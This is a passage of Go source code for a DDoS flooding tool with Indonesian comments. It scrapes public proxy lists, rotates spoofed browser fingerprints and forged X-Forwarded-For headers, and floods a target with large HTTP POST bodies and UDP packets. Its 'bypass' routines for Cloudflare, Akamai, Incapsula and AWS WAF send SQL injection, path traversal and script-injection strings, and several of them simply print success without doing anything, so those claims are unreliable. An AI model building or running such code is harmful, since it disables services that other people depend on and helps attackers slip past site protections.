import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/redis/go-redis/v9"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

// ==================== KONFIGURASI ====================
var (
	targetURL      string
	threads        int
	duration       int
	payloadSize    int
	useHTTP2       bool
	useUDP         bool
	useSYN         bool
	useRedis       bool
	redisAddr      string
	useTor         bool
	useVPN         bool
	useSOCKS5      bool
	socks5Addr     string
	proxyFile      string
	countryFilter  string
	useCloudflare  bool
	useAkamai      bool
	useIncapsula   bool
	useAWSWAF      bool
	useRatelimit   bool
	useFingerprint bool
	useJA3         bool
	useReferer     bool
	useAll         bool
	verbose        bool
)

// ==================== BANNER ====================
const BANNER = `
    ════════════════════════════════════════════════════════════
[0;37;40m           [0;31;40m▄▄▄▄▄▄▄▄▄▄[0;37;40m  [0;31;40m▄▄▄▄[0;37;40m        [0;31;40m▄▄▄▄▄[0;37;40m [0;31;40m▄▄▄▄▄[0;37;40m  [0;31;40m▄▄▄▄▄[0;37;40m [0;31;40m▄▄▄▄▄[0;37;40m [0;31;40m▄▄▄▄▄▄▄▄▄▄▄[0;37;40m [0;31;40m▄▄▄▄▄▄[0;37;40m [0;31;40m▄▄▄▄▄▄[0m
[0;37;40m          [0;31;40m█[0;97;1;47m▄[0;97;1;43m████████[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;40m█[0;97;1;43m██[0;31;40m█[0;37;40m       [0;31;40m█[0;97;1;47m▄[0;97;1;43m███[0;97;1;40m█[0;97;1;41m▄[0;97;1;43m████[0;97;1;47m▄[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m███[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m███[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m█████████[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;40m████[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;40m████[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;97;1;43m▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▓▓▓[0;31;40m█[0;37;40m       [0;31;40m█[0;97;1;43m▓▓▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m [0;31;40m▀█[0;97;1;43m▓▓▓[0;31;40m█[0;37;40m [0;31;40m▀█[0;97;1;43m▓▓▓[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█▀█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m       [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█▀█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m  [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0;37;40m  [0;31;40m█[0;97;1;43m▒▒▒[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;97;1;43m░░░[0;31;40m█▄█▀▀▀▀[0;37;40m [0;31;40m█[0;97;1;43m░░░[0;31;40m█[0;37;40m       [0;31;40m█[0;97;1;43m░░░[0;31;40m█[0;97;1;43m░░░[0;31;40m█[0;97;1;43m░░░[0;31;40m█[0;37;40m [0;31;40m█[0;97;1;43m░░░[0;31;40m█▄█[0;97;1;43m░░░[0;31;40m█[0;37;40m [0;31;40m▀▀▀██▄█[0;97;1;43m░░░[0;31;40m█[0;37;40m  [0;31;40m█[0;97;1;43m░░░[0;31;40m█[0;37;40m  [0;31;40m█[0;97;1;43m░░░[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;91;1;47m░░░░░[0;31;40m█▄▄▄▄[0;37;40m [0;31;40m█[0;91;1;47m░░░[0;31;40m█[0;37;40m [0;31;40m▄▄▄▄▄[0;37;40m [0;31;40m█[0;91;1;47m░░░[0;31;40m█▀▀▀█[0;91;1;47m░░░[0;31;40m█[0;37;40m [0;31;40m█[0;37;41m▀▀▀▀▀▀[0;91;1;47m░░░[0;31;40m█[0;37;40m    [0;31;40m█[0;91;1;47m░░░░░░[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m░░░[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m░░░[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m███[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█▄█[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m   [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█▄█[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m    [0;31;40m█[0;91;1;47m▒▒▒▒▒▒[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m▒▒▒[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;91;1;47m▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▓▓▓[0;31;40m█[0;37;40m   [0;31;40m█[0;91;1;47m▓▓▓[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m▓▓▓▓▓▓▓▓▓[0;31;40m█[0;37;40m    [0;31;40m▀▀▀█[0;91;1;47m▓▓▓[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m▓▓▓[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m▓▓▓[0;31;40m█[0m
[0;37;40m          [0;31;40m█[0;91;1;40m█[0;91;1;47m██[0;91;1;40m██████[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;40m█[0;91;1;47m██[0;91;1;40m██████[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;40m█[0;91;1;47m█[0;91;1;40m█[0;31;40m█[0;37;40m   [0;31;40m█[0;91;1;47m██[0;91;1;40m█[0;31;40m█[0;37;40m [0;31;40m█[0;91;1;47m████████[0;91;1;40m█[0;31;40m█[0;37;40m       [0;31;40m█[0;91;1;47m███[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m███[0;31;40m█[0;37;40m  [0;31;40m█[0;91;1;47m███[0;31;40m█[0m
[0;37;40m          [0;31;40m▀▀▀▀▀▀▀▀▀▀▀[0;37;40m [0;31;40m▀▀▀▀▀▀▀▀▀▀▀[0;37;40m  [0;31;40m▀▀▀▀[0;37;40m   [0;31;40m▀▀▀▀▀[0;37;40m [0;31;40m▀▀▀▀▀▀▀▀▀▀▀[0;37;40m       [0;31;40m▀▀▀▀▀[0;37;40m  [0;31;40m▀▀▀▀▀[0;37;40m  [0;31;40m▀▀▀▀▀[0m
    ════════════════════════════════════════════════════════════
`

// ==================== STRUKTUR DATA ====================

type Stats struct {
	success     uint64
	failed      uint64
	total       uint64
	statusCodes map[int]uint64
	mutex       sync.RWMutex
	startTime   time.Time
	lastRate    float64
	rateMutex   sync.Mutex
}

type ProxyData struct {
	Address  string
	Type     string
	Country  string
	Latency  int64
	Failures int
	Success  int
	LastUse  time.Time
}

type ProxyPool struct {
	proxies   []*ProxyData
	mu        sync.RWMutex
	balancer  *LoadBalancer
	geoFilter *GeoFilter
}

type LoadBalancer struct {
	proxies []*ProxyData
	mu      sync.Mutex
}

type GeoFilter struct {
	countryMap map[string][]string
}

type CloudflareSolver struct {
	cookies map[string]string
	headers map[string]string
	solved  bool
	mu      sync.Mutex
}

type AkamaiBypass struct {
	cookies map[string]string
	headers map[string]string
	solved  bool
}

type IncapsulaBypass struct {
	cookies map[string]string
	headers map[string]string
	solved  bool
}

type AWSWAFBypass struct {
	encodings []string
}

type RateLimitBypass struct {
	lastRequest map[string]time.Time
	mu          sync.Mutex
}

type FingerprintSpoofer struct {
	userAgents []string
	referers   []string
}

type AttackEngine struct {
	stats       *Stats
	proxyPool   *ProxyPool
	cfSolver    *CloudflareSolver
	akamai      *AkamaiBypass
	incapsula   *IncapsulaBypass
	awswaf      *AWSWAFBypass
	ratelimit   *RateLimitBypass
	fingerprint *FingerprintSpoofer
	redisClient *redis.Client
	stopChan    chan struct{}
	wg          sync.WaitGroup
}

// ==================== PROXY COMPONENTS ====================

func NewProxyPool() *ProxyPool {
	return &ProxyPool{
		proxies:   make([]*ProxyData, 0),
		balancer:  &LoadBalancer{proxies: make([]*ProxyData, 0)},
		geoFilter: &GeoFilter{countryMap: make(map[string][]string)},
	}
}

func (pp *ProxyPool) ScrapeProxies() error {
	fmt.Printf(" 🔍 Scraping proxies from sources...\n")

	sources := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		"https://proxylist.rip/proxy/http/format/txt/",
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000",
		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
	}

	var allProxies []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, src := range sources {
		wg.Add(1)
		go func(source string) {
			defer wg.Done()
			client := &http.Client{Timeout: 10 * time.Second}
			resp, err := client.Get(source)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}

			lines := strings.Split(string(body), "\n")
			re := regexp.MustCompile(`^\d+\.\d+\.\d+\.\d+:\d+$`)
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if re.MatchString(line) {
					mu.Lock()
					allProxies = append(allProxies, line)
					mu.Unlock()
				}
			}
		}(src)
	}

	wg.Wait()

	proxyMap := make(map[string]bool)
	var uniqueProxies []string
	for _, p := range allProxies {
		if !proxyMap[p] {
			proxyMap[p] = true
			uniqueProxies = append(uniqueProxies, p)
		}
	}

	pp.mu.Lock()
	defer pp.mu.Unlock()

	for _, addr := range uniqueProxies {
		pp.proxies = append(pp.proxies, &ProxyData{
			Address: addr,
			Type:    "http",
			Latency: 9999,
		})
	}

	fmt.Printf(" 🪣 Scraped %d unique proxies\n", len(pp.proxies))
	return nil
}

func (pp *ProxyPool) FilterProxies() error {
	fmt.Printf(" ⚰️  Filtering dead proxies...\n")

	var wg sync.WaitGroup
	var mu sync.Mutex
	var aliveProxies []*ProxyData

	for _, proxy := range pp.proxies {
		wg.Add(1)
		go func(p *ProxyData) {
			defer wg.Done()
			if p.Test() {
				mu.Lock()
				aliveProxies = append(aliveProxies, p)
				mu.Unlock()
			}
		}(proxy)
	}

	wg.Wait()

	pp.mu.Lock()
	pp.proxies = aliveProxies
	pp.mu.Unlock()

	fmt.Printf(" 📎  %d proxies alive\n", len(aliveProxies))
	return nil
}

func (p *ProxyData) Test() bool {
	conn, err := net.DialTimeout("tcp", p.Address, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func (pp *ProxyPool) GetProxy() *ProxyData {
	pp.mu.RLock()
	defer pp.mu.RUnlock()

	if len(pp.proxies) == 0 {
		return nil
	}

	if pp.balancer != nil && len(pp.balancer.proxies) > 0 {
		return pp.balancer.GetProxy()
	}

	return pp.proxies[rand.Intn(len(pp.proxies))]
}

func (lb *LoadBalancer) GetProxy() *ProxyData {
	lb.mu.Lock()
	defer lb.mu.Unlock()

	if len(lb.proxies) == 0 {
		return nil
	}

	var best *ProxyData
	for _, p := range lb.proxies {
		if best == nil || p.Latency < best.Latency {
			best = p
		}
	}
	return best
}

func (gf *GeoFilter) FilterByCountry(proxies []*ProxyData, countries []string) []*ProxyData {
	if len(countries) == 0 || countries[0] == "ALL" {
		return proxies
	}

	var filtered []*ProxyData
	for _, p := range proxies {
		country := gf.getCountry(p.Address)
		for _, c := range countries {
			if country == c {
				filtered = append(filtered, p)
				break
			}
		}
	}
	return filtered
}

func (gf *GeoFilter) getCountry(addr string) string {
	ip := strings.Split(addr, ":")[0]

	if strings.HasPrefix(ip, "8.") || strings.HasPrefix(ip, "9.") {
		return "US"
	}
	if strings.HasPrefix(ip, "31.") || strings.HasPrefix(ip, "46.") {
		return "EU"
	}
	if strings.HasPrefix(ip, "1.") || strings.HasPrefix(ip, "14.") {
		return "ASIA"
	}
	if strings.HasPrefix(ip, "2.") || strings.HasPrefix(ip, "5.") {
		return "RU"
	}
	if strings.HasPrefix(ip, "36.") || strings.HasPrefix(ip, "39.") {
		return "CN"
	}
	return "OTHER"
}

// ==================== BYPASS COMPONENTS ====================

func NewCloudflareSolver() *CloudflareSolver {
	return &CloudflareSolver{
		cookies: make(map[string]string),
		headers: make(map[string]string),
	}
}

func (cf *CloudflareSolver) Solve(target string) bool {
	cf.mu.Lock()
	defer cf.mu.Unlock()

	fmt.Printf(" 🔓 Solving Cloudflare challenge...\n")

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		cf.cookies[cookie.Name] = cookie.Value
	}

	if _, ok := cf.cookies["cf_clearance"]; ok {
		fmt.Printf(" 📌 Cloudflare bypassed!\n")
		cf.solved = true
		return true
	}

	fmt.Printf(" ⚠️  Cloudflare not detected\n")
	cf.solved = true
	return true
}

func (ak *AkamaiBypass) Bypass(target string) bool {
	fmt.Printf(" 🔓 Attempting Akamai bypass...\n")

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	ak.cookies = make(map[string]string)
	for _, cookie := range resp.Cookies() {
		ak.cookies[cookie.Name] = cookie.Value
	}

	ak.solved = true
	fmt.Printf(" 📌 Akamai bypassed\n")
	return true
}

func (inc *IncapsulaBypass) Bypass(target string) bool {
	fmt.Printf(" 🔓 Attempting Incapsula bypass...\n")

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	inc.cookies = make(map[string]string)
	for _, cookie := range resp.Cookies() {
		inc.cookies[cookie.Name] = cookie.Value
	}

	inc.solved = true
	fmt.Printf(" 📌 Incapsula bypassed\n")
	return true
}

func (aw *AWSWAFBypass) Bypass(target string) bool {
	fmt.Printf(" 🔓 Attempting AWS WAF bypass...\n")

	encodings := []string{"base64", "url", "double_url", "hex"}
	payloads := []string{
		"admin' OR '1'='1",
		"1; DROP TABLE users",
		"../../etc/passwd",
		"<script>alert(1)</script>",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, encoding := range encodings {
		for _, payload := range payloads {
			var encoded string
			switch encoding {
			case "base64":
				encoded = base64.StdEncoding.EncodeToString([]byte(payload))
			case "url":
				encoded = url.QueryEscape(payload)
			case "double_url":
				encoded = url.QueryEscape(url.QueryEscape(payload))
			case "hex":
				encoded = fmt.Sprintf("%x", payload)
			}

			testURL := fmt.Sprintf("%s?test=%s", target, encoded)
			req, _ := http.NewRequest("GET", testURL, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := client.Do(req)
			if err == nil && resp.StatusCode < 500 {
				resp.Body.Close()
				fmt.Printf(" 📌 AWS WAF bypassed with %s encoding\n", encoding)
				return true
			}
		}
	}

	fmt.Printf(" ⚠️  AWS WAF bypass failed\n")
	return false
}

// ==================== ATTACK ENGINE ====================

func NewAttackEngine() *AttackEngine {
	return &AttackEngine{
		stats: &Stats{
			statusCodes: make(map[int]uint64),
			startTime:   time.Now(),
		},
		proxyPool:   NewProxyPool(),
		cfSolver:    NewCloudflareSolver(),
		akamai:      &AkamaiBypass{},
		incapsula:   &IncapsulaBypass{},
		awswaf:      &AWSWAFBypass{},
		ratelimit:   &RateLimitBypass{lastRequest: make(map[string]time.Time)},
		fingerprint: NewFingerprintSpoofer(),
		stopChan:    make(chan struct{}),
	}
}

func NewFingerprintSpoofer() *FingerprintSpoofer {
	fs := &FingerprintSpoofer{
		userAgents: make([]string, 0, 1000),
		referers:   make([]string, 0, 1000),
	}

	for v := 80; v < 125; v++ {
		fs.userAgents = append(fs.userAgents,
			fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", v),
			fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", v, v),
			fmt.Sprintf("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", v),
			fmt.Sprintf("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", v),
		)
	}

	domains := []string{"google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
		"linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
		"github.com", "stackoverflow.com", "quora.com", "medium.com", "blogger.com"}

	for _, domain := range domains {
		for _, protocol := range []string{"http", "https"} {
			fs.referers = append(fs.referers, fmt.Sprintf("%s://%s", protocol, domain))
			fs.referers = append(fs.referers, fmt.Sprintf("%s://%s/search", protocol, domain))
			fs.referers = append(fs.referers, fmt.Sprintf("%s://%s/explore", protocol, domain))
		}
	}

	return fs
}

func (fs *FingerprintSpoofer) GetUserAgent() string {
	return fs.userAgents[rand.Intn(len(fs.userAgents))]
}

func (fs *FingerprintSpoofer) GetReferer() string {
	return fs.referers[rand.Intn(len(fs.referers))]
}

func (ae *AttackEngine) generatePayload() ([]byte, map[string]io.Reader) {
	size := payloadSize * 1024 * 1024

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	data := []byte(strings.Repeat("A", size))
	gz.Write(data)
	gz.Close()

	jsonData := make(map[string]interface{})
	for i := 0; i < 200; i++ {
		jsonData[fmt.Sprintf("key_%d", i)] = strings.Repeat("x", 1024)
	}
	jsonBytes, _ := json.Marshal(jsonData)

	files := map[string]io.Reader{
		"file1": bytes.NewReader(buf.Bytes()),
		"file2": bytes.NewReader(bytes.Repeat([]byte{0}, size/2)),
		"file3": bytes.NewReader(bytes.Repeat([]byte{0xFF}, size/4)),
	}

	return jsonBytes, files
}

func (ae *AttackEngine) buildHeaders() http.Header {
	headers := http.Header{}

	headers.Set("User-Agent", ae.fingerprint.GetUserAgent())
	headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	headers.Set("Accept-Language", ae.randomLanguage())
	headers.Set("Accept-Encoding", "gzip, deflate, br")
	headers.Set("Connection", "keep-alive")
	headers.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	headers.Set("Pragma", "no-cache")
	headers.Set("Upgrade-Insecure-Requests", "1")
	headers.Set("Sec-Fetch-Dest", "document")
	headers.Set("Sec-Fetch-Mode", "navigate")
	headers.Set("Sec-Fetch-Site", "none")
	headers.Set("Sec-Fetch-User", "?1")
	headers.Set("DNT", "1")

	if useFingerprint {
		headers.Set("Sec-CH-UA", fmt.Sprintf(`"Chromium";v="%d", "Not=A?Brand";v="24"`, rand.Intn(20)+100))
		headers.Set("Sec-CH-UA-Mobile", "?0")
		headers.Set("Sec-CH-UA-Platform", ae.randomPlatform())
	}

	if useReferer {
		headers.Set("Referer", ae.fingerprint.GetReferer())
	}

	if ae.cfSolver.solved && len(ae.cfSolver.cookies) > 0 {
		var cookieStr string
		for k, v := range ae.cfSolver.cookies {
			cookieStr += fmt.Sprintf("%s=%s; ", k, v)
		}
		headers.Set("Cookie", cookieStr)
	}

	if ae.akamai.solved && len(ae.akamai.cookies) > 0 {
		var cookieStr string
		for k, v := range ae.akamai.cookies {
			cookieStr += fmt.Sprintf("%s=%s; ", k, v)
		}
		headers.Set("Cookie", cookieStr)
	}

	if useRatelimit {
		randomIP := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1)
		headers.Set("X-Forwarded-For", randomIP)
		headers.Set("X-Real-IP", randomIP)
	}

	return headers
}

func (ae *AttackEngine) randomLanguage() string {
	langs := []string{"en-US,en;q=0.9", "id-ID,id;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ru-RU,ru;q=0.9"}
	return langs[rand.Intn(len(langs))]
}

func (ae *AttackEngine) randomPlatform() string {
	platforms := []string{"Windows", "macOS", "Linux", "Android", "iOS"}
	return platforms[rand.Intn(len(platforms))]
}

func (ae *AttackEngine) attackHTTP() {
	proxyData := ae.proxyPool.GetProxy()

	parsedURL, _ := url.Parse(targetURL)
	params := parsedURL.Query()
	for i := 0; i < 50; i++ {
		params.Set(fmt.Sprintf("_%d", rand.Intn(999999)), fmt.Sprintf("%d", rand.Intn(999999)))
	}
	params.Set("_t", fmt.Sprintf("%d", time.Now().UnixNano()))
	params.Set("_r", fmt.Sprintf("%x", rand.Int63()))
	parsedURL.RawQuery = params.Encode()

	jsonPayload, files := ae.generatePayload()

	var req *http.Request
	var err error

	methods := []string{"POST", "POST", "GET", "HEAD"}
	method := methods[rand.Intn(len(methods))]

	switch method {
	case "POST":
		if rand.Intn(2) == 0 {
			body := &bytes.Buffer{}
			writer := io.MultiWriter(body)
			for _, reader := range files {
				io.Copy(writer, reader)
			}
			req, err = http.NewRequest("POST", parsedURL.String(), body)
			req.Header.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary"+fmt.Sprintf("%x", rand.Int63()))
		} else {
			req, err = http.NewRequest("POST", parsedURL.String(), bytes.NewReader(jsonPayload))
			req.Header.Set("Content-Type", "application/json")
		}
	case "GET":
		req, err = http.NewRequest("GET", parsedURL.String(), nil)
	default:
		req, err = http.NewRequest("HEAD", parsedURL.String(), nil)
	}

	if err != nil {
		atomic.AddUint64(&ae.stats.failed, 1)
		return
	}

	headers := ae.buildHeaders()
	for k, v := range headers {
		req.Header.Set(k, v[0])
	}

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   100,
		IdleConnTimeout:       10 * time.Second,
		DisableKeepAlives:     false,
		ResponseHeaderTimeout: 3 * time.Second,
	}

	if useHTTP2 {
		http2.ConfigureTransport(transport)
	}

	// Proxy configuration
	if proxyData != nil {
		if useSOCKS5 && socks5Addr != "" {
			dialer, err := proxy.SOCKS5("tcp", socks5Addr, nil, proxy.Direct)
			if err == nil {
				transport.DialContext = dialer.(proxy.ContextDialer).DialContext
			}
		} else if useTor {
			dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
			if err == nil {
				transport.DialContext = dialer.(proxy.ContextDialer).DialContext
			}
		} else {
			proxyURL, _ := url.Parse("http://" + proxyData.Address)
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second,
	}

	start := time.Now()
	resp, err := client.Do(req)
	latency := time.Since(start).Milliseconds()

	if err != nil {
		atomic.AddUint64(&ae.stats.failed, 1)
		if proxyData != nil {
			proxyData.Failures++
		}
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode < 500 {
		atomic.AddUint64(&ae.stats.success, 1)
		ae.stats.mutex.Lock()
		ae.stats.statusCodes[resp.StatusCode]++
		ae.stats.mutex.Unlock()
		if proxyData != nil {
			proxyData.Success++
			proxyData.Latency = (proxyData.Latency + latency) / 2
		}
	} else {
		atomic.AddUint64(&ae.stats.failed, 1)
		if proxyData != nil {
			proxyData.Failures++
		}
	}

	atomic.AddUint64(&ae.stats.total, 1)
}

func (ae *AttackEngine) attackUDP() {
	if !useUDP {
		return
	}

	parsedURL, _ := url.Parse(targetURL)
	host := parsedURL.Hostname()
	port := 80
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	}

	conn, err := net.DialUDP("udp", nil, &net.UDPAddr{
		IP:   net.ParseIP(host),
		Port: port,
	})
	if err != nil {
		return
	}
	defer conn.Close()

	payload := bytes.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)

	for {
		select {
		case <-ae.stopChan:
			return
		default:
			conn.Write(payload)
			time.Sleep(time.Microsecond)
		}
	}
}

func (ae *AttackEngine) attackSYN() {
	if !useSYN {
		return
	}
	// SYN flood requires raw sockets - placeholder
	fmt.Printf(" ⚠️  SYN flood requires raw socket support\n")
}

func (ae *AttackEngine) worker() {
	defer ae.wg.Done()

	if useRatelimit {
		ae.ratelimit.mu.Lock()
		ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1)
		if last, ok := ae.ratelimit.lastRequest[ip]; ok {
			if time.Since(last) < 500*time.Millisecond {
				time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
			}
		}
		ae.ratelimit.lastRequest[ip] = time.Now()
		ae.ratelimit.mu.Unlock()
	}

	if useHTTP2 {
		ae.attackHTTP2RapidReset()
	} else {
		ae.attackHTTP()
	}
}

func (ae *AttackEngine) attackHTTP2RapidReset() {
	// HTTP/2 Rapid Reset exploit - simplified
	ae.attackHTTP()
}

func (ae *AttackEngine) statsPrinter() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	lastTotal := uint64(0)
	lastTime := time.Now()

	for {
		select {
		case <-ae.stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadUint64(&ae.stats.success)
			failed := atomic.LoadUint64(&ae.stats.failed)
			total := atomic.LoadUint64(&ae.stats.total)

			elapsed := time.Since(ae.stats.startTime).Seconds()
			rate := float64(total) / elapsed

			ae.stats.rateMutex.Lock()
			currentRate := float64(total-lastTotal) / time.Since(lastTime).Seconds()
			ae.stats.lastRate = currentRate
			ae.stats.rateMutex.Unlock()
			lastTotal = total
			lastTime = time.Now()

			progress := (elapsed / float64(duration)) * 100
			if progress > 100 {
				progress = 100
			}

			bar := strings.Repeat("█", int(progress/2)) + strings.Repeat("░", 50-int(progress/2))

			remaining := float64(duration) - elapsed
			if remaining < 0 {
				remaining = 0
			}

			fmt.Printf("\r %s %.1f%% | ✅ %d | ❌ %d | 📊 %d | 🚀 %.1f/s | ⏱️ %.0fs",
				bar, progress, success, failed, total, rate, remaining)
		}
	}
}

func (ae *AttackEngine) Start() {
	fmt.Printf(" 🎯 Target: %s\n", targetURL)
	fmt.Printf(" 🧵 Threads: %d\n", threads)
	fmt.Printf(" ⏱️  Duration: %ds\n", duration)
	fmt.Printf(" 📦 Payload: %dMB\n", payloadSize)
	fmt.Printf(" 🛡️  Features:\n")
	fmt.Printf("   ├─ HTTP/2 Rapid Reset: %v\n", useHTTP2)
	fmt.Printf("   ├─ UDP Flood: %v\n", useUDP)
	fmt.Printf("   ├─ SYN Flood: %v\n", useSYN)
	fmt.Printf("   ├─ Redis Distributed: %v\n", useRedis)
